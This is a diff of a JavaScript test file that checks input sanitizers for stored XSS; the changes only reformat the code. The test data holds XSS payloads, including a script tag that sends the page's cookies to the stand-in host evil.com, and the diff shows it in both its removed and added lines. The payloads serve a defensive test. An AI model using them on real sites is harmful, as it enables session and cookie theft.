@@ -272,17 +272,21 @@ describe('sanitizeUserName', () => {
 describe('Security Guarantees', () => {
   it('should prevent stored XSS by escaping all user content', () => {
     const userInputs = [
-      { type: 'text', value: '<script>document.location="http://evil.com?c="+document.cookie</script>' },
+      {
+        type: 'text',
+        value: '<script>document.location="http://evil.com?c="+document.cookie</script>',
+      },
       { type: 'email', value: '"><script>alert(1)</script>"@test.com' },
       { type: 'name', value: '<img src=x onerror=alert(1)>' },
     ];
 
     for (const input of userInputs) {
-      const sanitized = input.type === 'email'
-        ? sanitizeEmail(input.value)
-        : input.type === 'name'
-        ? sanitizeUserName(input.value)
-        : sanitizeText(input.value);
+      const sanitized =
+        input.type === 'email'
+          ? sanitizeEmail(input.value)
+          : input.type === 'name'
+            ? sanitizeUserName(input.value)
+            : sanitizeText(input.value);
 
       // Critical: No raw HTML tags should exist (< and > must be escaped)
       // This prevents browser from parsing as HTML elements
